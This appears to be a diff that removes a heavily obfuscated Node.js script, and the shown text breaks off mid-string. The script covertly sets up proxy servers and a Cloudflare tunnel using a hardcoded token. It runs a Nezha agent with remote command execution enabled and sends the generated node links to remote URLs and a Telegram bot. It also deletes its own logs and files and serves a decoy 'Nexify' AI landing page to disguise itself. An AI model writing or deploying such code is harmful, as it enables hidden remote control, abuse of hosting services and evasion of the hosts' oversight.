@@ -1,3 +1,1941 @@
 #!/usr/bin/env node
 
-const _0x71d8d2=_0x40b3;(function(_0x434be0,_0x5a644a){const _0x50726b=_0x40b3,_0x282ba0=_0x434be0();while(!![]){try{const _0x10613b=parseInt(_0x50726b(0x185))/0x1+-parseInt(_0x50726b(0x101))/0x2+parseInt(_0x50726b(0x1c8))/0x3*(parseInt(_0x50726b(0x15a))/0x4)+parseInt(_0x50726b(0x1ff))/0x5*(-parseInt(_0x50726b(0xfb))/0x6)+parseInt(_0x50726b(0x144))/0x7*(-parseInt(_0x50726b(0x1b6))/0x8)+parseInt(_0x50726b(0x1e7))/0x9+parseInt(_0x50726b(0x161))/0xa*(-parseInt(_0x50726b(0x114))/0xb);if(_0x10613b===_0x5a644a)break;else _0x282ba0['push'](_0x282ba0['shift']());}catch(_0x282a2b){_0x282ba0['push'](_0x282ba0['shift']());}}}(_0x2389,0x45cad));const fs=require('fs'),path=require('path'),os=require('os'),http=require(_0x71d8d2(0x17f)),crypto=require(_0x71d8d2(0x1fb)),axios=require('axios'),koffi=require(_0x71d8d2(0x184)),{execSync}=require(_0x71d8d2(0x100));try{require('dotenv')[_0x71d8d2(0x200)]();}catch{}const UPLOAD_URL=process.env.UPLOAD_URL||'',PROJECT_URL=process.env.PROJECT_URL||'',AUTO_ACCESS=process.env.AUTO_ACCESS||![],YT_WARPOUT=process.env.YT_WARPOUT||![],FILE_PATH=process.env.FILE_PATH||'.npm',SUB_PATH=process.env.SUB_PATH||_0x71d8d2(0x20b),UUID=process.env.UUID||_0x71d8d2(0x129),NEZHA_SERVER=process.env.NEZHA_SERVER||_0x71d8d2(0x20e),NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||_0x71d8d2(0x106),ARGO_DOMAIN=process.env.ARGO_DOMAIN||_0x71d8d2(0x1f3),ARGO_AUTH=process.env.ARGO_AUTH||_0x71d8d2(0x1ca),ARGO_PORT=Number(process.env.ARGO_PORT)||0x4ed9,S5_PORT=process.env.S5_PORT||'',TUIC_PORT=process.env.TUIC_PORT||'',HY2_PORT=process.env.HY2_PORT||'',ANYTLS_PORT=process.env.ANYTLS_PORT||'',REALITY_PORT=process.env.REALITY_PORT||'',CFIP=process.env.CFIP||_0x71d8d2(0xf9),CFPORT=Number(process.env.CFPORT)||0x1bb,PORT=Number(process.env.PORT)||0x1f90,NAME=process.env.NAME||'suga',CHAT_ID=process.env.CHAT_ID||'',BOT_TOKEN=process.env.BOT_TOKEN||'',DISABLE_ARGO=process.env.DISABLE_ARGO||![],ROOT=process[_0x71d8d2(0x13e)](),runtimeFilePath=path[_0x71d8d2(0x171)](ROOT,FILE_PATH),libraryDir=runtimeFilePath,singBoxConfigPath=path['resolve'](runtimeFilePath,_0x71d8d2(0x1d5)),nezhaConfigPath=path['resolve'](runtimeFilePath,_0x71d8d2(0x107)),bootLogPath=path[_0x71d8d2(0x171)](runtimeFilePath,_0x71d8d2(0x10d)),subPath=path[_0x71d8d2(0x171)](runtimeFilePath,_0x71d8d2(0x10e)),listPath=path['resolve'](runtimeFilePath,_0x71d8d2(0x132)),keypairPath=path[_0x71d8d2(0x171)](runtimeFilePath,_0x71d8d2(0x120)),subscribePath='/'+SUB_PATH[_0x71d8d2(0x134)](/^\//,''),httpPort=PORT,arch=((()=>{const _0x4efdfe=_0x71d8d2,_0x2eb3e3=os[_0x4efdfe(0x148)]()['toLowerCase']();if(_0x2eb3e3==='arm64'||_0x2eb3e3===_0x4efdfe(0x1e5))return'arm64';return _0x4efdfe(0x143);})());let privateKey='',publicKey='';function isValidPort(_0x4276a6){const _0x459474=_0x71d8d2;try{if(_0x4276a6===null||_0x4276a6===undefined||_0x4276a6==='')return![];if(typeof _0x4276a6==='string'&&_0x4276a6[_0x459474(0x125)]()==='')return![];const _0x312b1e=parseInt(_0x4276a6);if(isNaN(_0x312b1e))return![];if(_0x312b1e<0x1||_0x312b1e>0xffff)return![];return!![];}catch(_0x5eedf0){return![];}}const pathsToDelete=['boot.log',_0x71d8d2(0x132),_0x71d8d2(0x1d5),_0x71d8d2(0x107),_0x71d8d2(0x1a8),_0x71d8d2(0x103),_0x71d8d2(0x105),_0x71d8d2(0x14c)];function cleanupOldFiles(){const _0x5a1796=_0x71d8d2;pathsToDelete[_0x5a1796(0x213)](_0x367126=>{const _0x1066d1=_0x5a1796,_0x4d3c85=path[_0x1066d1(0x155)](FILE_PATH,_0x367126);fs[_0x1066d1(0x1cb)](_0x4d3c85,()=>{});});const _0x292163=path[_0x5a1796(0x171)](ROOT,'.tmp');if(fs['existsSync'](_0x292163))try{fs[_0x5a1796(0x1ad)](_0x292163,{'recursive':!![],'force':!![]});}catch(_0x28cf85){}}function cleanupFiles(_0x165e01={}){const _0x1eef3d=_0x71d8d2,_0x39bd4f=new Set([_0x1eef3d(0x120)]);if(_0x165e01[_0x1eef3d(0x158)])_0x39bd4f[_0x1eef3d(0x1d2)](_0x1eef3d(0x10e));if(fs['existsSync'](runtimeFilePath))try{const _0x1bef31=fs[_0x1eef3d(0x1d0)](runtimeFilePath);for(const _0xf33677 of _0x1bef31){if(_0x39bd4f[_0x1eef3d(0x176)](_0xf33677))continue;const _0x15034b=path[_0x1eef3d(0x171)](runtimeFilePath,_0xf33677);try{const _0x5e1831=fs[_0x1eef3d(0x204)](_0x15034b);_0x5e1831[_0x1eef3d(0x1c4)]()?fs[_0x1eef3d(0x1ad)](_0x15034b,{'recursive':!![],'force':!![]}):fs[_0x1eef3d(0x173)](_0x15034b);}catch(_0x7f8dc3){}}}catch(_0x15ad22){console['error'](_0x1eef3d(0x194),_0x15ad22[_0x1eef3d(0xfa)]);}const _0x1830f8=path[_0x1eef3d(0x171)](ROOT,_0x1eef3d(0x193));if(fs[_0x1eef3d(0x166)](_0x1830f8))try{fs[_0x1eef3d(0x1ad)](_0x1830f8,{'recursive':!![],'force':!![]});}catch(_0x2dc7ae){}}function clearConsole(){const _0x2f13bc=_0x71d8d2;process[_0x2f13bc(0x211)][_0x2f13bc(0x17b)]('\x1Bc');}function deleteNodes(){const _0x74675d=_0x71d8d2;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1531ea;try{_0x1531ea=fs[_0x74675d(0x10b)](subPath,_0x74675d(0x175));}catch{return null;}const _0x1c0cb4=Buffer['from'](_0x1531ea,_0x74675d(0x17e))['toString'](_0x74675d(0x175)),_0x42b5b6=_0x1c0cb4['split']('\x0a')[_0x74675d(0x1d8)](_0x4ca8cb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x74675d(0x1f2)](_0x4ca8cb));if(_0x42b5b6[_0x74675d(0x108)]===0x0)return;return axios[_0x74675d(0x1c6)](UPLOAD_URL+_0x74675d(0x12d),JSON['stringify']({'nodes':_0x42b5b6}),{'headers':{'Content-Type':_0x74675d(0x118)}})[_0x74675d(0x14d)](()=>null);}catch(_0xde0a4e){return null;}}function argoType(){const _0x9937be=_0x71d8d2;if(DISABLE_ARGO===_0x9937be(0x1e4)||DISABLE_ARGO===!![]){console[_0x9937be(0x1b8)](_0x9937be(0x11a));return;}if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x9937be(0x1b8)](_0x9937be(0x1c3));return;}if(ARGO_AUTH['includes'](_0x9937be(0x1e9))){fs[_0x9937be(0x14f)](path[_0x9937be(0x155)](FILE_PATH,_0x9937be(0x105)),ARGO_AUTH);const _0x422037=_0x9937be(0x1f6)+ARGO_AUTH[_0x9937be(0x177)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x9937be(0x155)](FILE_PATH,_0x9937be(0x105))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x9937be(0x201)+ARGO_PORT+_0x9937be(0x1f0);fs['writeFileSync'](path[_0x9937be(0x155)](FILE_PATH,'tunnel.yml'),_0x422037);}else console[_0x9937be(0x1b8)](_0x9937be(0x1c2)+ARGO_PORT+'\x20in\x20cloudflare');}function _0x40b3(_0x58bf67,_0x350d5b){_0x58bf67=_0x58bf67-0xf4;const _0x238977=_0x2389();let _0x40b3cd=_0x238977[_0x58bf67];return _0x40b3cd;}async function sha256Matches(_0x26ce61,_0x418f4f){const _0x566d12=_0x71d8d2;if(!_0x418f4f)return!![];const _0x17f0f9=await sha256(_0x26ce61);return _0x17f0f9[_0x566d12(0xf5)]()===_0x418f4f[_0x566d12(0xf5)]();}function sha256(_0x31a853){return new Promise((_0x5d5525,_0x401696)=>{const _0x2ae444=_0x40b3,_0x3ecb9f=crypto[_0x2ae444(0x10c)](_0x2ae444(0xfc)),_0x3ada88=fs[_0x2ae444(0x187)](_0x31a853);_0x3ada88['on'](_0x2ae444(0x205),_0xefdc5=>_0x3ecb9f[_0x2ae444(0x13c)](_0xefdc5)),_0x3ada88['on']('end',()=>_0x5d5525(_0x3ecb9f[_0x2ae444(0x159)](_0x2ae444(0x1c7)))),_0x3ada88['on'](_0x2ae444(0x1ba),_0x401696);});}async function downloadLibrary(_0x430167,_0x20ca61,_0x3118d0){const _0xfe1b27=_0x71d8d2,_0x245326=path[_0xfe1b27(0x171)](libraryDir,_0x20ca61);if(fs[_0xfe1b27(0x166)](_0x245326)&&await sha256Matches(_0x245326,_0x3118d0))return console[_0xfe1b27(0x1b8)](_0xfe1b27(0x169)+_0x245326),_0x245326;await fs[_0xfe1b27(0x19d)]['mkdir'](libraryDir,{'recursive':!![]});const _0x37508c=path[_0xfe1b27(0x171)](libraryDir,_0x20ca61+'.download'),_0x30fc54=fs['createWriteStream'](_0x37508c);console['log']('Downloading\x20'+_0x430167+_0xfe1b27(0x11f)+_0x245326);const _0x1b756d=await axios[_0xfe1b27(0x20f)](_0x430167,{'responseType':_0xfe1b27(0x1e1),'timeout':0x3*0x3c*0x3e8});if(_0x1b756d[_0xfe1b27(0x123)]<0xc8||_0x1b756d[_0xfe1b27(0x123)]>=0x12c)throw new Error(_0xfe1b27(0x127)+_0x430167+_0xfe1b27(0x10a)+_0x1b756d[_0xfe1b27(0x123)]);_0x1b756d['data'][_0xfe1b27(0x11b)](_0x30fc54),await new Promise((_0x3e3140,_0x448227)=>_0x30fc54['on'](_0xfe1b27(0x1bc),_0x3e3140)['on'](_0xfe1b27(0x1ba),_0x448227));if(!await sha256Matches(_0x37508c,_0x3118d0))throw new Error(_0xfe1b27(0x12a)+_0x37508c);return await fs['promises'][_0xfe1b27(0x135)](_0x37508c,_0x245326),_0x245326;}function createService(_0x588dd0,_0x3e4134,_0x12f18c,_0x1415f7,_0x2b2d20){const _0x286f00=_0x71d8d2,_0x1f463e=koffi[_0x286f00(0x126)](_0x3e4134),_0x369d8b=_0x1f463e[_0x286f00(0x1a2)](_0x286f00(0x1bb)+_0x12f18c+_0x286f00(0x109)),_0x701691=_0x1f463e[_0x286f00(0x1a2)](_0x286f00(0x1bb)+_0x1415f7+'()');return{'name':_0x588dd0,'start':()=>{const _0x445aa6=_0x286f00;_0x369d8b[_0x445aa6(0x195)](_0x2b2d20||'',(_0x5923e9,_0x24fb7e)=>{const _0x29ffac=_0x445aa6;if(_0x5923e9)console[_0x29ffac(0x1ba)](_0x588dd0+_0x29ffac(0x203)+_0x5923e9[_0x29ffac(0xfa)]);else _0x24fb7e!==0x0&&console[_0x29ffac(0x16b)](_0x588dd0+_0x29ffac(0x202)+_0x24fb7e);});},'stop':()=>new Promise((_0x3c4860,_0x214d08)=>{try{_0x701691['async']((_0x21e5d5,_0xad04f7)=>{if(_0x21e5d5)return _0x214d08(_0x21e5d5);_0x3c4860(_0xad04f7);});}catch(_0x671a82){_0x3c4860(-0x1);}})};}const _X25519_P=(0x1n<<0xffn)-0x13n,_X25519_A24=0x1db41n;function _clampScalar(_0x2cb53b){_0x2cb53b[0x0]&=0xf8,_0x2cb53b[0x1f]&=0x7f,_0x2cb53b[0x1f]|=0x40;}function _mod(_0x9f9308){return _0x9f9308=(_0x9f9308%_X25519_P+_X25519_P)%_X25519_P,_0x9f9308;}function _decodeLE(_0x9032f0){const _0x1ca0dc=_0x71d8d2;let _0x36f566=0x0n;for(let _0x5e9f64=_0x9032f0[_0x1ca0dc(0x108)]-0x1;_0x5e9f64>=0x0;_0x5e9f64--){_0x36f566=_0x36f566<<0x8n|BigInt(_0x9032f0[_0x5e9f64]);}return _0x36f566;}function _encodeLE(_0x4cb831){const _0x379531=_0x71d8d2,_0x45e017=Buffer[_0x379531(0x179)](0x20);for(let _0x3297b4=0x0;_0x3297b4<0x20;_0x3297b4++){_0x45e017[_0x3297b4]=Number(_0x4cb831&0xffn),_0x4cb831>>=0x8n;}return _0x45e017;}function _x25519(_0x554f28,_0x319939){const _0xd3c740=_0x71d8d2;let _0xdf882d=_decodeLE(_0x319939),_0xe0ddeb=0x1n,_0x361d6f=0x0n,_0x26ccb7=_0xdf882d,_0xbdb242=0x1n,_0x5d975a=0x0;for(let _0x10b50a=0xfe;_0x10b50a>=0x0;_0x10b50a--){const _0x9d4062=Math[_0xd3c740(0x207)](_0x10b50a/0x8),_0x191cbd=(_0x554f28[_0x9d4062]&0xff)>>_0x10b50a%0x8&0x1;_0x5d975a^=_0x191cbd;_0x5d975a&&([_0xe0ddeb,_0x26ccb7]=[_0x26ccb7,_0xe0ddeb],[_0x361d6f,_0xbdb242]=[_0xbdb242,_0x361d6f]);_0x5d975a=_0x191cbd;const _0x39e68f=_mod(_0xe0ddeb+_0x361d6f),_0x2e6eb7=_mod(_0x39e68f*_0x39e68f),_0x2104e1=_mod(_0xe0ddeb-_0x361d6f+_X25519_P),_0x25afb8=_mod(_0x2104e1*_0x2104e1),_0x1b85e5=_mod(_0x2e6eb7-_0x25afb8+_X25519_P),_0x2d305b=_mod(_0x26ccb7+_0xbdb242),_0x473163=_mod(_0x26ccb7-_0xbdb242+_X25519_P),_0x1c6743=_mod(_0x473163*_0x39e68f),_0x3bd974=_mod(_0x2d305b*_0x2104e1);_0x26ccb7=_mod((_0x1c6743+_0x3bd974)*(_0x1c6743+_0x3bd974)),_0xbdb242=_mod(_0xdf882d*_mod((_0x1c6743-_0x3bd974+_X25519_P)*(_0x1c6743-_0x3bd974+_X25519_P))),_0xe0ddeb=_mod(_0x2e6eb7*_0x25afb8),_0x361d6f=_mod(_0x1b85e5*_mod(_0x2e6eb7+_X25519_A24*_0x1b85e5));}_0x5d975a&&([_0xe0ddeb,_0x26ccb7]=[_0x26ccb7,_0xe0ddeb],[_0x361d6f,_0xbdb242]=[_0xbdb242,_0x361d6f]);const _0x4deb04=_modPow(_0x361d6f,_X25519_P-0x2n,_X25519_P);return _encodeLE(_mod(_0xe0ddeb*_0x4deb04));}function _modPow(_0x5db152,_0x26f2cc,_0x4b0bae){let _0x4c156d=0x1n;_0x5db152=_0x5db152%_0x4b0bae;while(_0x26f2cc>0x0n){if(_0x26f2cc%0x2n===0x1n)_0x4c156d=_0x4c156d*_0x5db152%_0x4b0bae;_0x26f2cc>>=0x1n,_0x5db152=_0x5db152*_0x5db152%_0x4b0bae;}return _0x4c156d;}function generateRealityKeyPair(){const _0x2e6e36=_0x71d8d2,_0x2fcf66=crypto[_0x2e6e36(0x149)](0x20);_clampScalar(_0x2fcf66);const _0x1fa4f1=Buffer[_0x2e6e36(0x179)](0x20);_0x1fa4f1[0x0]=0x9;const _0x3158ee=_x25519(_0x2fcf66,_0x1fa4f1);return{'privateKey':_0x2fcf66[_0x2e6e36(0x1ea)](_0x2e6e36(0x19f)),'publicKey':_0x3158ee[_0x2e6e36(0x1ea)]('base64url')};}function generateOrLoadKeyPair(){const _0xa98ff0=_0x71d8d2;if(fs[_0xa98ff0(0x166)](keypairPath)){const _0x580463=fs['readFileSync'](keypairPath,'utf8'),_0x8d2a97=_0x580463[_0xa98ff0(0x140)](/PrivateKey:\s*(.*)/),_0x3e74a8=_0x580463['match'](/PublicKey:\s*(.*)/);if(_0x8d2a97&&_0x3e74a8){privateKey=_0x8d2a97[0x1],publicKey=_0x3e74a8[0x1],console['log'](_0xa98ff0(0x131),privateKey),console[_0xa98ff0(0x1b8)](_0xa98ff0(0x1b5),publicKey);return;}}const _0x18599b=generateRealityKeyPair();privateKey=_0x18599b[_0xa98ff0(0x150)],publicKey=_0x18599b['publicKey'],fs['writeFileSync'](keypairPath,_0xa98ff0(0x1e3)+privateKey+_0xa98ff0(0x1a3)+publicKey+'\x0a',_0xa98ff0(0x1d9)),console['log'](_0xa98ff0(0x131),privateKey),console[_0xa98ff0(0x1b8)](_0xa98ff0(0x1b5),publicKey);}const FALLBACK_EC_KEY=_0x71d8d2(0x181)+_0x71d8d2(0x170)+_0x71d8d2(0x113)+_0x71d8d2(0x16f)+_0x71d8d2(0x18e)+'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a'+'/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a'+_0x71d8d2(0x11e),FALLBACK_CERT=_0x71d8d2(0x1f5)+'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a'+_0x71d8d2(0x1e8)+'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a'+'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a'+'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a'+_0x71d8d2(0x12c)+_0x71d8d2(0x208)+_0x71d8d2(0x104)+_0x71d8d2(0x1b4);function ensureTlsCertificates(_0x1c4026,_0x11f366){const _0x3e0563=_0x71d8d2;if(fs['existsSync'](_0x1c4026)&&fs[_0x3e0563(0x166)](_0x11f366))return;fs['mkdirSync'](path['dirname'](_0x1c4026),{'recursive':!![]});try{execSync('openssl\x20version',{'stdio':_0x3e0563(0xf8)}),execSync(_0x3e0563(0x156)+_0x11f366+'\x22',{'stdio':_0x3e0563(0xf8)}),execSync(_0x3e0563(0x1ae)+_0x11f366+_0x3e0563(0x206)+_0x1c4026+_0x3e0563(0x1bd),{'stdio':_0x3e0563(0xf8)});return;}catch(_0x253903){}fs[_0x3e0563(0x14f)](_0x11f366,FALLBACK_EC_KEY),fs[_0x3e0563(0x14f)](_0x1c4026,FALLBACK_CERT);}function _0x2389(){const _0x3614ef=['HTTP\x20subscription\x20server\x20listening\x20on\x20http://0.0.0.0:','min','Add\x20YouTube\x20outbound\x20rule','2083','/vmess-argo?ed=2560','promises','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','base64url','/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#','setHeader','func','\x0aPublicKey:\x20','\x0atuic://','php\x20is\x20running','--loglevel','curl\x20-o\x20/dev/null\x20-m\x202\x20-s\x20-w\x20\x22%{http_code}\x22\x20https://www.youtube.com','cert.pem','ArgoDomain\x20not\x20found','output','Logs\x20will\x20be\x20deleted\x20in\x2045\x20seconds,\x20you\x20can\x20copy\x20the\x20above\x20nodes','remote','rmSync','openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22','mkdirSync','anytls','8443','netflix','/sendMessage','-----END\x20CERTIFICATE-----\x0a','Public\x20Key:','8bZXDfw','wireguard-out','log','tunnel','error','int\x20','finish','\x22\x20-subj\x20\x22/CN=bing.com\x22','ARGO_DOMAIN:','auto','Method\x20Not\x20Allowed','info','Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnel','isDirectory','App\x20is\x20running','post','hex','560379AhGuuY','https://api.ip.sb/geoip','eyJhIjoiM2ZmZTk1OGNkNDYxMzg1OGRjY2JhMjRlNjQxOGMwMjEiLCJ0IjoiZTE1NGVjZTUtZWQxMC00MTEzLWFhNzgtY2E4NmY0MWU3OTA2IiwicyI6IlptRTBPRFl4TkdFdE1tVTNOeTAwWlRFMkxUZ3pZV010WlRkak56UXhNV00zWVdObSJ9','unlink','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','http://localhost:','--config','vmess','readdirSync','tuic-in','add','isp','http://ip-api.com/json','config.json','EADDRINUSE','tuic','filter','utf8','200','TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG','/api/add-nodes','\x1b[0m','www.iij.ad.jp','org','```','stream','hysteria2','PrivateKey:\x20','true','aarch64','vless','2685942ZYuRNf','EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a','TunnelSecret','toString','direct','Content-Type','bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=','0.0.0.0/0','MarkdownV2','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://keep.gvrander.eu.org/add-url','test','suga.boosoyz.nyc.mn','StopNezhaAgent','-----BEGIN\x20CERTIFICATE-----\x0a','\x0a\x20\x20tunnel:\x20','sing-box','Waiting\x20for\x20quick\x20tunnel\x20domain\x20in\x20log...','--url','/v1.so','crypto','0.0.0.0','once','\x0avless://','45crPCdf','config','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20native\x20service\x20exited\x20with\x20code\x20','\x20native\x20service\x20failed:\x20','statSync','data','\x22\x20-out\x20\x22','floor','Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a','节点推送通知**\x0a```','includes','8462277','172.16.0.2/32','StartNezhaAgent','nezha.loc.cc:443','get','&type=tcp&headerType=none#','stdout','Subscription\x20uploaded\x20successfully','forEach','method','toLowerCase','\x5c$&','Sec-WebSocket-Protocol','ignore','cdn.7zz.cn','message','84684JRGKCG','sha256','GET','stringify','wireguard','child_process','129246iEtrFS','https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/youtube.srs','private.key','eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a','tunnel.json','4z0HWnSGJtKFtKOlfJxSkNC3F8PIJ448','config.yaml','length','(str)',':\x20HTTP\x20','readFileSync','createHash','boot.log','sub.txt','code','Mozilla/5.0','listen','http://ipv6.ip.sb','-----END\x20EC\x20PARAMETERS-----\x0a','192005PYvLQh','NEZHA\x20variable\x20is\x20empty,\x20skipping\x20nezha-agent','SIGTERM','youtube','application/json','YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=','DISABLE_ARGO\x20is\x20set\x20to\x20true,\x20disable\x20argo\x20tunnel','pipe','sbx.so','text/plain;\x20charset=utf-8','-----END\x20EC\x20PRIVATE\x20KEY-----\x0a','\x20->\x20','keypair.properties','Not\x20Found','2606:4700:110:8dfe:d141:69bb:6b80:925/128','status','pathname','trim','load','Failed\x20to\x20download\x20','substring','3849fde3-a911-480f-9590-c577c0fa8f66','SHA-256\x20mismatch\x20for\x20','/sbx.so','BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a','/api/delete-nodes','now','firefox','...','Private\x20Key:','list.txt','2087','replace','rename','2096','country_code','Telegram\x20message\x20sent\x20successfully','Failed\x20to\x20get\x20IP\x20address:','bot.so','--edge-ip-version','update','Port\x20','cwd','StopSingBox','match','vmess-ws-in','tls','amd64','67991KOFHcX','2053','--no-autoupdate','--logfile','arch','randomBytes','\x0ahysteria2://','push','tunnel.yml','catch','?security=tls&sni=','writeFileSync','privateKey','\x20in\x20use,\x20trying\x20','StartSingBox','Unknown','hysteria-in','join','openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22','stop','keepSub','digest','12ocMYBV','curl\x20-sm\x203\x20ipv4.ip.sb','end','wait','\x1b[32m','Add\x20URL\x20failed:\x20','<!DOCTYPE\x20html>\x0a<html\x20lang=\x22en\x22>\x0a<head>\x0a\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20<title>Nexify\x20|\x20AI\x20Automation\x20Suite\x20—\x20No‑Code\x20Intelligence</title>\x0a\x20\x20\x20\x20<link\x20rel=\x22stylesheet\x22\x20href=\x22https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css\x22>\x0a\x20\x20\x20\x20<link\x20href=\x22https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap\x22\x20rel=\x22stylesheet\x22>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20*\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-sizing:\x20border-box;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\x27Inter\x27,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201.6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#1e1f2a;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#fefcff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20h1,\x20h2,\x20h3,\x20h4,\x20.logo-text,\x20.plan-name,\x20.nav-links\x20a,\x20.cta-button,\x20.secondary-button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\x27Plus\x20Jakarta\x20Sans\x27,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x201280px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Header\x20&\x20Navigation\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20rgba(255,\x20255,\x20255,\x200.96);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backdrop-filter:\x20blur(8px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x201px\x202px\x20rgba(0,\x200,\x200,\x200.04),\x200\x202px\x208px\x20rgba(0,\x200,\x200,\x200.02);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20fixed;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x201000;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20all\x200.2s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20nav\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20space-between;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2018px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.logo\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.logo-icon\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2028px;\x0a\x20\x20\x20\x20\x20\x20\